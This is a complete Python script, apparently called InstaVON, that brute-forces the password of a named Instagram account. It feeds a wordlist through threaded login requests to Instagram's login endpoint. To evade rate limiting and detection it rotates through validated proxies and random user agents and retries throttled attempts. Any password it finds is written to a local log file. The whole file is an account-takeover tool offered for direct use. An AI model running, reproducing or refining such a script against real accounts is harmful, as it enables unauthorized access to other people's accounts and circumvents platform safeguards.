#!/usr/bin/python3

import requests
import argparse
import threading
import queue
import random
import time

###############################################################################

parser = argparse.ArgumentParser(
    description="InstaVON")

parser.add_argument('-w', '--wordlist',action='store', required=True,
                    help='Wordlist path')

parser.add_argument('-u', '--username', help='Instagram username',
                    action='store',required=True)

parser.add_argument('-p', '--proxy', help='ProxyList path',required=True,
                    action='store')

parser.add_argument('-t', '--thread', help='Threads', type=int, default=4)

args = parser.parse_args()

USER = args.username
wordlist = args.wordlist
proxylist = args.proxy
THREADS = args.thread

###############################################################################

###############################################################################

user_agents = ["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko)",
               "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1",
               "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)",
               "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
               "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
               "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))"]

###############################################################################
working_proxies = []

def get_csrf_token():
    global csrf_token
    try:
        csrf_token = requests.get("http://instagram.com").cookies["csrftoken"]
    except:
        print("[!] Something is wrong...")
        exit()

proxylen = 0
def check_proxy(que):
    global proxylen
    if not que.empty():
        try:
            p = que.get()
            proxy = {'https' : 'https://'+p}
            requests.get("https://api.ipify.org/",proxies=proxy,timeout=3.2)
        except:
            que.task_done()
        else:
            proxylen += 1
            print("[*] Working proxy:",proxylen,end="\r")
            working_proxies.append(p)
            que.task_done()

def check_proxy_thread():
    proxy_queue = queue.Queue()
    threads = []

    queuelock = threading.Lock()

    print("[*] Checking useful proxies.")

    try:
        proxyfile=open(proxylist).readlines()
        for word in proxyfile:
            word=word[:-1]
            proxy_queue.put(word)
        while not proxy_queue.empty():
            queuelock.acquire()
            for workers in range(THREADS):
                t = threading.Thread(target=check_proxy, args=(proxy_queue,))
                t.setDaemon(True)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            queuelock.release()
    except Exception as error:
        print(error)

print()

wordlen = len(open(wordlist).readlines())
tried = 0
found = False


logfile = open("instavon.log","a+")

def brute_force(que):
    if not que.empty():
        try:
            global found
            global brute_queue
            global wordlen
            global tried
            PASS = que.get()
            post_data = {
            'username': USER,
            'password': PASS
            }

            header = {
                "User-Agent": random.choice(user_agents),
                'X-Instagram-AJAX': '1',
                "X-CSRFToken": csrf_token,
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                'Cookie': 'csrftoken=' + csrf_token
            }

            random_proxy = random.choice(working_proxies)
            proxy = {'https' : 'https://'+random_proxy}

            url = "https://www.instagram.com/accounts/login/ajax/"

            print("[*] {} | {} |  {}/{}".format(random_proxy.center(22),
                                               PASS.center(20),
                                               tried,
                                               wordlen), end="\r")

            r = requests.post(url, headers=header,
                              data=post_data, proxies=proxy,
                              timeout=7)

            tried += 1


            if r.content.decode().find('"authenticated": true') == 1:
                print("\n\n[+] Password found. {} : {} ".format(USER,PASS))
                print("[+] Password found. {} : {} ".format(USER,PASS),file=logfile,flush=True)
                found = True
                que.queue.clear()
                que.task_done()

            if r.content.decode().find('"message": "checkpoint_required"') == 1:
                print("\n\n[+] Password found but login confirmation required. {} : {} ".format(USER,PASS))
                print("[+] Password found but login confirmation required. {} : {} ".format(USER,PASS),file=logfile,flush=True)
                found = True
                que.queue.clear()
                que.task_done()

            if r.content.decode().find('"message": "Please wait a few minutes before you try again."') == 1:
                tried -= 1
                brute_queue.put(PASS)
                que.task_done()

        except:
            brute_queue.put(PASS)
            que.task_done()

def brute_force_thread():
    global brute_queue
    brute_queue = queue.Queue()
    threads = []

    queuelock = threading.Lock()
    print("\n")
    print("[-]","proxy".center(22,"-"),"|","password".center(20,"-"),"|","remain".center(14,"-"))
    try:
        wordlistfile=open(wordlist).readlines()
        for word in wordlistfile:
            word=word[:-1]
            brute_queue.put(word)
        while not brute_queue.empty():
            queuelock.acquire()
            for workers in range(THREADS):
                t = threading.Thread(target=brute_force, args=(brute_queue,))
                t.setDaemon(True)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            queuelock.release()
            if found:
                break
        if not found:
            print("\n\n[*] Password not found.")

    except Exception as error:
        print(error)

get_csrf_token()
check_proxy_thread()

start_time = time.time()

brute_force_thread()

logfile.close()

end_time = time.time()

print("[*] Elapsed time: {}".format(time.strftime("%H:%M:%S", time.gmtime(int(end_time - start_time)))))
